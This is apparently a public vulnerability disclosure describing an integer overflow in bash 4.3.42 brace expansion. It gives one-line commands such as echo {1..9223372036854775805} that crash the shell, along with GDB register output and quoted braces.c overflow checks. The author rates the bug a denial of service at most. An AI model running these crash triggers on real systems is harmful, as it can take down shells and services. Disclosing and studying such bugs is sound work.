# Bash-Integer-Overflow

A integer overflow lives in the bash { } braces which affect the latest version:

```
$ $(which bash) --version
GNU bash, version 4.3.42(1)-release (x86_64-unknown-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

You can trigger the overflow by running this which results in a segmentation fault.

```
[@ ~]$ /usr/local/bin/bash -c "echo x86_64; echo {1..9223372036854775805};"
x86_64
Segmentation fault
[@ ~]$ /usr/local/bin/bash -c "echo x86; echo {1..2147483648};"
x86
Segmentation Fault
[@ ~]$
```

GDB:

```
(gdb) r -c "echo {1..9223372036854775805};"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/bin/bash -c "echo {1..9223372036854775805};"

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff771b4f8 in __memset_avx2 () from /usr/lib/libc.so.6
(gdb) i r
rax            0xdfdfdfdf	3755991007
rbx            0x1	1
rcx            0xffffffffffff81f8	-32264
rdx            0xfffffffffffffff0	-16
rsi            0x7001f8	7340536
rdi            0x708000	7372800
rbp            0x1	0x1
rsp            0x7fffffffe388	0x7fffffffe388
r8             0x1	1
r9             0x70763b	7370299
r10            0x0	0
r11            0x1999999999999999	1844674407370955161
r12            0x0	0
r13            0x0	0
r14            0x700208	7340552
r15            0xfffffffffffffff0	-16
rip            0x7ffff771b4f8	0x7ffff771b4f8 <__memset_avx2+392>
eflags         0x10287	[ CF PF SF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb)
```

The rax register is interesting as it's stuffed with 0xdfdfdfdf, however I don't think that it's possible to gain control of the cpu registers and this seems to just be a denial of service at the most.

Hilarious source code of braces.c that does multiple checks for an Integer overflow:

```
  /* Check that end-start will not overflow INTMAX_MIN, INTMAX_MAX.  The +3
     and -2, not strictly necessary, are there because of the way the number
     of elements and value passed to strvec_create() are calculated below. */
  if (SUBOVERFLOW (end, start, INTMAX_MIN+3, INTMAX_MAX-2))
    return ((char **)NULL);

  prevn = sh_imaxabs (end - start);
  /* Need to check this way in case INT_MAX == INTMAX_MAX */
  if (INT_MAX == INTMAX_MAX && (ADDOVERFLOW (prevn, 2, INT_MIN, INT_MAX)))
    return ((char **)NULL);
  /* Make sure the assignment to nelem below doesn't end up <= 0 due to
     intmax_t overflow */
  else if (ADDOVERFLOW ((prevn/sh_imaxabs(incr)), 1, INTMAX_MIN, INTMAX_MAX))
    return ((char **)NULL);

  /* XXX - TOFIX: potentially allocating a lot of extra memory if
     imaxabs(incr) != 1 */
  /* Instead of a simple nelem = prevn + 1, something like:
        nelem = (prevn / imaxabs(incr)) + 1;
     would work */
  nelem = (prevn / sh_imaxabs(incr)) + 1;
  if (nelem > INT_MAX - 2 || nelem < INT_MIN)           /* Don't overflow int */
        return ((char **)NULL);
  result = strvec_mcreate (nelem + 1);
  if (result == 0)
    {
      internal_error (_("brace expansion: failed to allocate memory for %d elements"), nelem);
      return ((char **)NULL);
    }
```

I've notified the bash mailing list so I'll just make this public.
